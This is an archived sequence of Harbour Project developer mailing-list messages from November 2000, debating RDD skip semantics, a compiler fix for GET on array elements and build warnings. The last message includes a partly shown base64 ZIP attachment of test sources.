    intended to provide the functionality of the CA-Clipper SKIP command.

Default Behavior

    The default implementation of skip() calls skipFilter() and skipRaw() to
    successfully navigate the work area.  skip() also sets wa-&gt;fTop,
    wa-&gt;fBottom, wa-&gt;fBof, and wa-&gt;fEof, when appropriate.

    Note:  As implemented, skip() may pass a zero (0) value to skipRaw()
    indicating that a COMMIT (flush()) is to be performed.
________

    In my opinion, dbSkip() should call dbSkipRaw() and then dbSkipFilter(),
but it could be otherwise. Harbour developers should just choose one
behaviour and document it (better than it was), so RDD developers can be
sure what to expect.

Harrier

----- Original Message -----
From: &quot;Brian Hays&quot; &lt;<A HREF="mailto:bhays@abacuslaw.com">bhays@abacuslaw.com</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Wednesday, November 01, 2000 2:55 PM
Subject: Re: [Harbour] rdd SkipFilter


&gt;<i> Harrier:
</I>&gt;<i>
</I>&gt;<i> &gt;     skipFilter() skips to the next visible record, obeying filter and
</I>&gt;<i> scope
</I>&gt;<i> &gt; as
</I>&gt;<i> &gt;     well as the deleted row settings.  skipFilter() is provided for
</I>skip()
&gt;<i> &gt;     optimization.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; I think this means exacly what you say.
</I>&gt;<i>
</I>&gt;<i> Unfortunately NO!  The text is a bit ambiguous.
</I>&gt;<i> The problem is, our skipFilter( 1 ) will ONLY &quot;skips to the next visible
</I>&gt;<i> record&quot; IF it's on a &quot;invisible&quot; record!
</I>&gt;<i>
</I>&gt;<i> As written I would expect it instead to skip FROM a current GOOD record as
</I>&gt;<i> well. This is a critical difference!
</I>&gt;<i> That's why it would be great to find someone with experience writing for
</I>&gt;<i> clipper's to confirm the expected behavior...
</I>&gt;<i>
</I>&gt;<i> Brian
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 09:51:02 2000
Date: Thu Nov  2 09:51:02 2000
From: Chen Kedem harbour@lists.harbour-project.org
Subject: [Harbour] Re: CHANGELOG 2000-11-02 00:10 GMT -3 (Luiz)

<PRE>Luiz,

(I think you forgot to send the CHANGELOG notifcation to the list)

1. doc/en/tbrowse.txt - could you please add CVS ID
2. doc/en/rddord.txt  - there are 5 lines at the top of this
                        document which looks a bit redundant
3. doc/en/garbage.txt - change // into /* */ in CVS header
4. doc/en/idle.txt    - change // into /* */ in CVS header

  Chen.

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 10:45:03 2000
Date: Thu Nov  2 10:45:03 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>Ignacio,

Originally I had the same idea as you and Antonio, but than I spent a short
time looking at the ITEM API, and it seems that this is not so
trivial/correct. I think that the limitation of not being able to pass array
element by reference is not an omission, but rather the result of a more
serious issue.

I reviewed the way Clipper handles this, and ended up taking the same
approach.

If you look at how Clipper handles it, you will find that _GET_ is processed
by the *parser* to either __GET(...) or __GETA(...).

If the get variable is a [simple] array element, than the parser generates a
code to call __GETA(...), it passes to it as 1st parameter the _base_ array
(remember arrays are always passed by reference), it also parses the array
index and passes an *array* with one element for *each* *index* *expression*
as the last parameter to __GETA(). __GETA() than creates a SetGet block,
using the *BaseArray* and the array of Index Expression[s].

If the get variable is either a simple var or any expression involving the
':' send operator (even if Array Element), the parser generates a call to
__GET(...) which is equivalent to how we did it before my fix.

My tests show Harbour to be 100% compatible here. Unless we see a problem
with the way Clipper solves this problem I think that my proposed fix is
correct.

Ron

&gt;<i> Ron,
</I>&gt;<i>
</I>&gt;<i> Great job!! BTW I think it will be great if we have a function like
</I>&gt;<i> AddressOf(xVar) which returns a pointer to hb_item and one more SetGet
</I>&gt;<i> function to retrieve and change his value, for example
</I>&gt;<i> pHbItemSetGet(cPointer, xNewValue) --&gt; xOldValue
</I>&gt;<i>
</I>&gt;<i> With this two functions we can achieve all the functionality
</I>&gt;<i> needed with no
</I>&gt;<i> need to parse any source code.
</I>&gt;<i>
</I>&gt;<i> Regards,
</I>&gt;<i>
</I>&gt;<i> Ignacio Ortiz
</I>&gt;<i> Email: <A HREF="mailto:ignacio@ozs.com">ignacio@ozs.com</A>
</I>&gt;<i> http: www.ozs.com
</I>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 10:49:02 2000
Date: Thu Nov  2 10:49:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] testbrw.prg Compiler error!!

<PRE>Hi ?

These are warnings not errors. I just built TestBrw and got the same
warnings but it did get compiled, linked, and works *correctly*.

Try to look at your log for the _error_.

Ron

&gt;<i> Hello!!
</I>&gt;<i> I compiler testbrw.prg from RedHat 6.2!!
</I>&gt;<i> ----------------------------------------------------------
</I>&gt;<i> [<A HREF="mailto:ssbbs@MySQL">ssbbs@MySQL</A> harbour]# ./make_gnu.sh all
</I>&gt;<i> ----------------------------------------------------------
</I>&gt;<i> gcc -Wall -g -otestbrdb
</I>&gt;<i> estbrdb.o  -L../../../source/debug/linux/gcc  -L../../p
</I>&gt;<i> ../../../source/compiler/linux/gcc/harbour
</I>&gt;<i> ../../testbrw.prg  -n -q0 -w -es2 -ge
</I>&gt;<i> ../../testbrw.prg(131) Warning W0001  Ambiguous reference: 'NTMPROW'
</I>&gt;<i> ../../testbrw.prg(132) Warning W0001  Ambiguous reference: 'NTMPCOL'
</I>&gt;<i> ../../testbrw.prg(134) Warning W0001  Ambiguous reference: 'NTMPROW'
</I>&gt;<i> ../../testbrw.prg(134) Warning W0001  Ambiguous reference: 'NTMPCOL'
</I>&gt;<i>
</I>&gt;<i> No code generated.
</I>&gt;<i> make[2]: *** [testbrw.c] Error 1
</I>&gt;<i> make[2]: Leaving directory `/usr/local/harbour/tests/linux/gcc'
</I>&gt;<i> make[1]: *** [^^^d^e^s^c^e^n^d^^^] Error 2
</I>&gt;<i> make[1]: Leaving directory `/usr/local/harbour/tests'
</I>&gt;<i> make: *** [first] Error 2
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 11:00:04 2000
Date: Thu Nov  2 11:00:04 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET (Ryszard)

<PRE>Antonio Linares wrote:

&gt;<i> &gt; Another way to do it is to create a public symbol wich points to arr[i]
</I>&gt;<i> &gt; hb_item, and make the codeblock around that public symbol (just a thought)
</I>&gt;<i> 
</I>&gt;<i> We do need a function, kind of:  (same idea as we implemented
</I>&gt;<i> @&lt;Function&gt;() )
</I>
  Since someone has asked... :)

I think we cannot avoid some kind of compiler hacking. The expression
optimizer can split the array expression and use a detached variable for
indexes.

So the command:
@ 0,0 GET a[ i ]
will be preprocessed into:
_GET_( a[i], &quot;a[ i ]&quot;,,,, )

Next the expression optimizer can split 'a[i]' into 'a' and '{i}' and
generate a final expression:
__GETA( a, {i}, &quot;a[ i ]&quot;,,,, )

The same for :
@ 0,0 GET a:var[ i+1, j+5 ]
will be replaced with:
__GETA( a:var, { i+1, j+5 }, ..... )


Inside __GETA we will have to assign a get/set codeblock:
FUNCTION __GETA( aVar, aIndex, ... )
LOCAL oGextObj:=TGET:new()

oGetObj:block := {|xValue| __GetValue(aVar, aIndex, 1, xValue)}

RETURN oGetObj

where 
STATIC FUNCTION __GetValue( aVar, aIndex, nIndex, xValue )
  IF( nIndex == 1 )
    RETURN IIF( PCOUNT()&lt;3, aVar[ aIndex[ 1 ] ], aVar[ aIndex[ 1 ]
]:=xValue )
  ELSE
    RETURN __GetValue( aVar[ aIndex[ nIndex ] ], aIndex, nIndex+1,
xValue )

If we add this replacement into the expression optimizer code then it
will be available for macro processing too. Separating the variable and
the index will allow to implement TGet:subscript although I don't
remember now a real usage of :subscript variable.

Regards, Ryszard

Simmilar processing can be done for message sending if it is required.

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 11:14:02 2000
Date: Thu Nov  2 11:14:02 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET (Ryszard)

<PRE>rglab wrote:

Well almost correct...

&gt;<i> STATIC FUNCTION __GetValue( aVar, aIndex, nIndex, xValue )
</I>&gt;<i>   IF( nIndex == 1 )
</I>&gt;<i>     RETURN IIF( PCOUNT()&lt;3, aVar[ aIndex[ 1 ] ], aVar[ aIndex[ 1 ]
</I>&gt;<i> ]:=xValue )
</I>&gt;<i>   ELSE
</I>&gt;<i>     RETURN __GetValue( aVar[ aIndex[ nIndex ] ], aIndex, nIndex+1,
</I>&gt;<i> xValue )
</I>
this should be:

STATIC FUNCTION __GetValue( aVar, aIndex, nIndex, xValue )
  IF( nIndex == LEN(aIndex) )
    RETURN IIF( PCOUNT()&lt;4, aVar[ aIndex[ nIndex ] ], aVar[ aIndex[
nIndex ] ]:=xValue )
  ELSE
    RETURN __GetValue( aVar[ aIndex[ nIndex ] ], aIndex, nIndex+1,
xValue )

or something like that :)

Regards, Ryszard

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 11:23:02 2000
Date: Thu Nov  2 11:23:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET (Ryszard)

<PRE>Ryszard,

Please review rules I added for GET in harbour.sly, I have already done it
practically the same way you describe. If we all approve, I'll try to copy
same into harbour.y next week.

Ron

&gt;<i> Antonio Linares wrote:
</I>&gt;<i>
</I>&gt;<i> &gt; &gt; Another way to do it is to create a public symbol wich points
</I>&gt;<i> to arr[i]
</I>&gt;<i> &gt; &gt; hb_item, and make the codeblock around that public symbol
</I>&gt;<i> (just a thought)
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; We do need a function, kind of:  (same idea as we implemented
</I>&gt;<i> &gt; @&lt;Function&gt;() )
</I>&gt;<i>
</I>&gt;<i>   Since someone has asked... :)
</I>&gt;<i>
</I>&gt;<i> I think we cannot avoid some kind of compiler hacking. The expression
</I>&gt;<i> optimizer can split the array expression and use a detached variable for
</I>&gt;<i> indexes.
</I>&gt;<i>
</I>&gt;<i> So the command:
</I>&gt;<i> @ 0,0 GET a[ i ]
</I>&gt;<i> will be preprocessed into:
</I>&gt;<i> _GET_( a[i], &quot;a[ i ]&quot;,,,, )
</I>&gt;<i>
</I>&gt;<i> Next the expression optimizer can split 'a[i]' into 'a' and '{i}' and
</I>&gt;<i> generate a final expression:
</I>&gt;<i> __GETA( a, {i}, &quot;a[ i ]&quot;,,,, )
</I>&gt;<i>
</I>&gt;<i> The same for :
</I>&gt;<i> @ 0,0 GET a:var[ i+1, j+5 ]
</I>&gt;<i> will be replaced with:
</I>&gt;<i> __GETA( a:var, { i+1, j+5 }, ..... )
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> Inside __GETA we will have to assign a get/set codeblock:
</I>&gt;<i> FUNCTION __GETA( aVar, aIndex, ... )
</I>&gt;<i> LOCAL oGextObj:=TGET:new()
</I>&gt;<i>
</I>&gt;<i> oGetObj:block := {|xValue| __GetValue(aVar, aIndex, 1, xValue)}
</I>&gt;<i>
</I>&gt;<i> RETURN oGetObj
</I>&gt;<i>
</I>&gt;<i> where
</I>&gt;<i> STATIC FUNCTION __GetValue( aVar, aIndex, nIndex, xValue )
</I>&gt;<i>   IF( nIndex == 1 )
</I>&gt;<i>     RETURN IIF( PCOUNT()&lt;3, aVar[ aIndex[ 1 ] ], aVar[ aIndex[ 1 ]
</I>&gt;<i> ]:=xValue )
</I>&gt;<i>   ELSE
</I>&gt;<i>     RETURN __GetValue( aVar[ aIndex[ nIndex ] ], aIndex, nIndex+1,
</I>&gt;<i> xValue )
</I>&gt;<i>
</I>&gt;<i> If we add this replacement into the expression optimizer code then it
</I>&gt;<i> will be available for macro processing too. Separating the variable and
</I>&gt;<i> the index will allow to implement TGet:subscript although I don't
</I>&gt;<i> remember now a real usage of :subscript variable.
</I>&gt;<i>
</I>&gt;<i> Regards, Ryszard
</I>&gt;<i>
</I>&gt;<i> Simmilar processing can be done for message sending if it is required.
</I>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 11:43:01 2000
Date: Thu Nov  2 11:43:01 2000
From: Ignacio Ortiz de Zuniga harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET (Ryszard)

<PRE>Ron,

&gt;&gt;<i>I'll try to copy same into harbour.y next week.
</I>
I really appreciate that. Thank you so much.

Regards,

Ignacio Ortiz
Email: <A HREF="mailto:ignacio@ozs.com">ignacio@ozs.com</A>
http: www.ozs.com

-----Mensaje original-----
De: <A HREF="mailto:harbour-admin@lists.harbour-project.org">harbour-admin@lists.harbour-project.org</A>
[mailto:<A HREF="mailto:harbour-admin@lists.harbour-project.org">harbour-admin@lists.harbour-project.org</A>]En nombre de Ron Pinkas
Enviado el: jueves, 02 de noviembre de 2000 17:24
Para: <A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>
Asunto: RE: [Harbour] bug in GET (Ryszard)


Ryszard,

Please review rules I added for GET in harbour.sly, I have already done it
practically the same way you describe. If we all approve, I'll try to copy
same into harbour.y next week.

Ron

&gt;<i> Antonio Linares wrote:
</I>&gt;<i>
</I>&gt;<i> &gt; &gt; Another way to do it is to create a public symbol wich points
</I>&gt;<i> to arr[i]
</I>&gt;<i> &gt; &gt; hb_item, and make the codeblock around that public symbol
</I>&gt;<i> (just a thought)
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; We do need a function, kind of:  (same idea as we implemented
</I>&gt;<i> &gt; @&lt;Function&gt;() )
</I>&gt;<i>
</I>&gt;<i>   Since someone has asked... :)
</I>&gt;<i>
</I>&gt;<i> I think we cannot avoid some kind of compiler hacking. The expression
</I>&gt;<i> optimizer can split the array expression and use a detached variable for
</I>&gt;<i> indexes.
</I>&gt;<i>
</I>&gt;<i> So the command:
</I>&gt;<i> @ 0,0 GET a[ i ]
</I>&gt;<i> will be preprocessed into:
</I>&gt;<i> _GET_( a[i], &quot;a[ i ]&quot;,,,, )
</I>&gt;<i>
</I>&gt;<i> Next the expression optimizer can split 'a[i]' into 'a' and '{i}' and
</I>&gt;<i> generate a final expression:
</I>&gt;<i> __GETA( a, {i}, &quot;a[ i ]&quot;,,,, )
</I>&gt;<i>
</I>&gt;<i> The same for :
</I>&gt;<i> @ 0,0 GET a:var[ i+1, j+5 ]
</I>&gt;<i> will be replaced with:
</I>&gt;<i> __GETA( a:var, { i+1, j+5 }, ..... )
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> Inside __GETA we will have to assign a get/set codeblock:
</I>&gt;<i> FUNCTION __GETA( aVar, aIndex, ... )
</I>&gt;<i> LOCAL oGextObj:=TGET:new()
</I>&gt;<i>
</I>&gt;<i> oGetObj:block := {|xValue| __GetValue(aVar, aIndex, 1, xValue)}
</I>&gt;<i>
</I>&gt;<i> RETURN oGetObj
</I>&gt;<i>
</I>&gt;<i> where
</I>&gt;<i> STATIC FUNCTION __GetValue( aVar, aIndex, nIndex, xValue )
</I>&gt;<i>   IF( nIndex == 1 )
</I>&gt;<i>     RETURN IIF( PCOUNT()&lt;3, aVar[ aIndex[ 1 ] ], aVar[ aIndex[ 1 ]
</I>&gt;<i> ]:=xValue )
</I>&gt;<i>   ELSE
</I>&gt;<i>     RETURN __GetValue( aVar[ aIndex[ nIndex ] ], aIndex, nIndex+1,
</I>&gt;<i> xValue )
</I>&gt;<i>
</I>&gt;<i> If we add this replacement into the expression optimizer code then it
</I>&gt;<i> will be available for macro processing too. Separating the variable and
</I>&gt;<i> the index will allow to implement TGet:subscript although I don't
</I>&gt;<i> remember now a real usage of :subscript variable.
</I>&gt;<i>
</I>&gt;<i> Regards, Ryszard
</I>&gt;<i>
</I>&gt;<i> Simmilar processing can be done for message sending if it is required.
</I>
_______________________________________________
Harbour mailing list
<A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
<A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>

Thank you for participating in The Harbour Project.  Be sure to check
<A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>



</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 11:47:02 2000
Date: Thu Nov  2 11:47:02 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET (Ryszard)

<PRE>Ron Pinkas wrote:

&gt;<i> Please review rules I added for GET in harbour.sly, I have already done it
</I>&gt;<i> practically the same way you describe. If we all approve, I'll try to copy
</I>&gt;<i> same into harbour.y next week.
</I>
  I disagree. You have hard coded the syntax of _GET_ into the syntax
parser (both the number of parameters and their type). This will limit
the possibility to extend the functionality of __GET and __GETA in
custom code. Such expression mangling is a job for the expression
optimizer. Notice also that this will allow to reuse the same code for
macro compilation.  The expression optimizer will just check if a called
function is _GET_ and will replace the first expression with the more
complex expression. We can even replace a[i,j] with { a, i,j } that will
leave the number of parameters unchanged.

Regards, Ryszard

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 12:20:03 2000
Date: Thu Nov  2 12:20:03 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET (Ryszard)

<PRE>Ryszard,

That's the way it is done in Clipper! Clipper does _not_ provide same for
macros!

Try the following in Clipper:

//------ Test.prg ----------//
FUNCTION Main()

   LOCAL Macro := &quot;aArray[M-&gt;Counter]&quot;

   PRIVATE aArray := { &quot;Macro&quot; }, Counter := 1

   CLEAR SCREEN

   @ 06,10 GET &amp;Macro

   M-&gt;Counter := 3

   READ

RETURN NIL
//------ EOF Test.prg ----------//

Finally, regardless of _where_ you do it, you will have to *assume* the
number of parameters and their type for __GET(...) and __GETA(...)! What
will be difference if you move my logic into the Expression Optimizer?.

Either way, to remain 100% compatible we shouldn't perform this &quot;mangling&quot;
in macro expressions. So I don't think there is any benefit in moving this
logic to the Expression Optimizer (where it will be &quot;hidden&quot;, i.e. far less
obvious).

At this point we are 100% compatible with Clipper (here). IAE, no need to
discuss it any further, feel free to implement it any way wish, I don't have
time to argue this issue.

Ron

&gt;<i> &gt; Please review rules I added for GET in harbour.sly, I have
</I>&gt;<i> already done it
</I>&gt;<i> &gt; practically the same way you describe. If we all approve, I'll
</I>&gt;<i> try to copy
</I>&gt;<i> &gt; same into harbour.y next week.
</I>&gt;<i>
</I>&gt;<i>   I disagree. You have hard coded the syntax of _GET_ into the syntax
</I>&gt;<i> parser (both the number of parameters and their type). This will limit
</I>&gt;<i> the possibility to extend the functionality of __GET and __GETA in
</I>&gt;<i> custom code. Such expression mangling is a job for the expression
</I>&gt;<i> optimizer. Notice also that this will allow to reuse the same code for
</I>&gt;<i> macro compilation.  The expression optimizer will just check if a called
</I>&gt;<i> function is _GET_ and will replace the first expression with the more
</I>&gt;<i> complex expression. We can even replace a[i,j] with { a, i,j } that will
</I>&gt;<i> leave the number of parameters unchanged.
</I>&gt;<i>
</I>&gt;<i> Regards, Ryszard
</I>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 12:26:01 2000
Date: Thu Nov  2 12:26:01 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET (Ryszard)

<PRE>Ignacio,

You are welcome!

Until some further resolution for harbour.y you can easily type:

   b32_slex [Enter]

It works exactly like:

   make_b32 [Enter]

Still just 9 key presses ;-)  but you will get a smaller, more complete
Harbour, and, smaller and faster Harbour applications.

Ron

&gt;<i> Ron,
</I>&gt;<i>
</I>&gt;<i> &gt;&gt;I'll try to copy same into harbour.y next week.
</I>&gt;<i>
</I>&gt;<i> I really appreciate that. Thank you so much.
</I>&gt;<i>
</I>&gt;<i> Regards,
</I>&gt;<i>
</I>&gt;<i> Ignacio Ortiz
</I>&gt;<i> Email: <A HREF="mailto:ignacio@ozs.com">ignacio@ozs.com</A>
</I>&gt;<i> http: www.ozs.com
</I>&gt;<i>
</I>&gt;<i> -----Mensaje original-----
</I>&gt;<i> De: <A HREF="mailto:harbour-admin@lists.harbour-project.org">harbour-admin@lists.harbour-project.org</A>
</I>&gt;<i> [mailto:<A HREF="mailto:harbour-admin@lists.harbour-project.org">harbour-admin@lists.harbour-project.org</A>]En nombre de Ron Pinkas
</I>&gt;<i> Enviado el: jueves, 02 de noviembre de 2000 17:24
</I>&gt;<i> Para: <A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>
</I>&gt;<i> Asunto: RE: [Harbour] bug in GET (Ryszard)
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> Ryszard,
</I>&gt;<i>
</I>&gt;<i> Please review rules I added for GET in harbour.sly, I have already done it
</I>&gt;<i> practically the same way you describe. If we all approve, I'll try to copy
</I>&gt;<i> same into harbour.y next week.
</I>&gt;<i>
</I>&gt;<i> Ron
</I>&gt;<i>
</I>&gt;<i> &gt; Antonio Linares wrote:
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; &gt; &gt; Another way to do it is to create a public symbol wich points
</I>&gt;<i> &gt; to arr[i]
</I>&gt;<i> &gt; &gt; &gt; hb_item, and make the codeblock around that public symbol
</I>&gt;<i> &gt; (just a thought)
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; We do need a function, kind of:  (same idea as we implemented
</I>&gt;<i> &gt; &gt; @&lt;Function&gt;() )
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;   Since someone has asked... :)
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; I think we cannot avoid some kind of compiler hacking. The expression
</I>&gt;<i> &gt; optimizer can split the array expression and use a detached variable for
</I>&gt;<i> &gt; indexes.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; So the command:
</I>&gt;<i> &gt; @ 0,0 GET a[ i ]
</I>&gt;<i> &gt; will be preprocessed into:
</I>&gt;<i> &gt; _GET_( a[i], &quot;a[ i ]&quot;,,,, )
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Next the expression optimizer can split 'a[i]' into 'a' and '{i}' and
</I>&gt;<i> &gt; generate a final expression:
</I>&gt;<i> &gt; __GETA( a, {i}, &quot;a[ i ]&quot;,,,, )
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; The same for :
</I>&gt;<i> &gt; @ 0,0 GET a:var[ i+1, j+5 ]
</I>&gt;<i> &gt; will be replaced with:
</I>&gt;<i> &gt; __GETA( a:var, { i+1, j+5 }, ..... )
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Inside __GETA we will have to assign a get/set codeblock:
</I>&gt;<i> &gt; FUNCTION __GETA( aVar, aIndex, ... )
</I>&gt;<i> &gt; LOCAL oGextObj:=TGET:new()
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; oGetObj:block := {|xValue| __GetValue(aVar, aIndex, 1, xValue)}
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; RETURN oGetObj
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; where
</I>&gt;<i> &gt; STATIC FUNCTION __GetValue( aVar, aIndex, nIndex, xValue )
</I>&gt;<i> &gt;   IF( nIndex == 1 )
</I>&gt;<i> &gt;     RETURN IIF( PCOUNT()&lt;3, aVar[ aIndex[ 1 ] ], aVar[ aIndex[ 1 ]
</I>&gt;<i> &gt; ]:=xValue )
</I>&gt;<i> &gt;   ELSE
</I>&gt;<i> &gt;     RETURN __GetValue( aVar[ aIndex[ nIndex ] ], aIndex, nIndex+1,
</I>&gt;<i> &gt; xValue )
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; If we add this replacement into the expression optimizer code then it
</I>&gt;<i> &gt; will be available for macro processing too. Separating the variable and
</I>&gt;<i> &gt; the index will allow to implement TGet:subscript although I don't
</I>&gt;<i> &gt; remember now a real usage of :subscript variable.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Regards, Ryszard
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Simmilar processing can be done for message sending if it is required.
</I>&gt;<i>
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 13:29:02 2000
Date: Thu Nov  2 13:29:02 2000
From: David G. Holm harbour@lists.harbour-project.org
Subject: [Harbour] testbrw.prg Compiler error!!

<PRE>** Reply to message from &quot;Ron Pinkas&quot; &lt;<A HREF="mailto:ron@profit-master.com">ron@profit-master.com</A>&gt; on Thu, 2
Nov 2000 07:50:16 -0800

&gt;<i> These are warnings not errors. I just built TestBrw and got the same
</I>&gt;<i> warnings but it did get compiled, linked, and works *correctly*.
</I>
Except that Harbour is supposed to compile clean, because the GNU Make
System uses both -w and -es2. Warnings are not allowed and must be
fixed. The testbrw program used to compile without any warnings, so
whoever introduced the warnings in should remove them by declaring the
temporary variables LOCAL.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 15:28:02 2000
Date: Thu Nov  2 15:28:02 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] Re: dynsym.c caused GPF

<PRE>--Message-Boundary-17497
Content-type: text/plain; charset=US-ASCII
Content-transfer-encoding: 7BIT
Content-description: Mail message body

Maurilio,

I can't reproduce your problem here :-((((

Perhaps, it's my fault, It is possible I have so simplified your 
program it does'nt GPF anymore.

Could you please try to compile the 3 files within test.zip attached 
and let me know if it GPF or no.

I think I have the same inheritence you had.

_Take_CARE_!!!! the name of the files within test.zip will collide 
with yours !!!! farmaq.prg, tfarmaq.prg and tsqlbrw.prg !!!!!!!!

Please try it and let me know the result.

Best regards,

J. Lefebvre,
Bruxelles,
Belgium


--Message-Boundary-17497
Content-type: text/plain; charset=US-ASCII
Content-disposition: inline
Content-description: Attachment information.

The following section of this message contains a file attachment
prepared for transmission using the Internet MIME message format.
If you are using Pegasus Mail, or any another MIME-compliant system,
you should be able to save it or view it from within your mailer.
If you cannot, please ask your system administrator for assistance.

   ---- File information -----------
     File:  Test.zip
     Date:  2 Nov 2000, 21:31
     Size:  6031 bytes.
     Type:  ZIP-archive

--Message-Boundary-17497
Content-type: Application/ZIP; name=&quot;Test.zip&quot;
Content-disposition: attachment; filename=&quot;Test.zip&quot;
Content-transfer-encoding: BASE64

UEsDBBQAAgAIALqRWyn1/Xe/9gIAAKoGAAAKAAAARkFSTUFRLlBSR41U227bOBB9X6D/MPA+
VE6UeO226W7QYNE6KlIgdRzH3cU+LRhxXBGlOC4vdtJP6A/0dzuULFlyUaAyCJNnhkPOOZwZ
jeCtsKW4PX3yW/z9rkyug0QY5FSWZE7zYtBFi/tcC+cOYbSW7CG4UhoVHaLKfMLHGoy/taUc
ZbAIpVAmyccp5BMez3g85/GCxxmPl8PoDQCacqGBMqk82RToDu0Gbc+YX5HzM1EinF/AoMIK
RgZdlw8ObWW2RH3LnPP7l6ysrD3LpfDijXDYWDo2xVdc0qcddpctYZrNlh8W/8HNrIWy+c30
CpY3MP7r7I+d6+gIXusSDYHSIPmA+3iAC5AHBZtACrTYkBVMUHIihyBxo0AqW6ImOBpVMdQK
5lMKxidDeAWTCuOvQL1Ohs3qc1C+mqORarU7XcVUxtV0W7BckCh4ddFGazjnL2YXnYv7/+f/
CB0wUcfHHbskyPnmrXvMotpzwVydFIPGEG1deX4W7yCA7AXoCvGLAUIvQKP+L25e9zZ3H8jP
ApAv0G7VnpAf9OhKUqvS8sdzSbtY0+vs9QLupossm+2gS+XWb+gheS8eFrRlzU/gzxTGKXSA
ejUlXa+G+9f2DtbCMvneKnBkCJwXXkFOZiO0kjxPQWyEqbH4KqsH2D620QimFgXop1iVIEjF
iaB9rKy7uozULO9ur+tVMjyf4TZpdU9rAdI9lele014aL1OY9IBJLy9enS5P2+RGkLlcgRSR
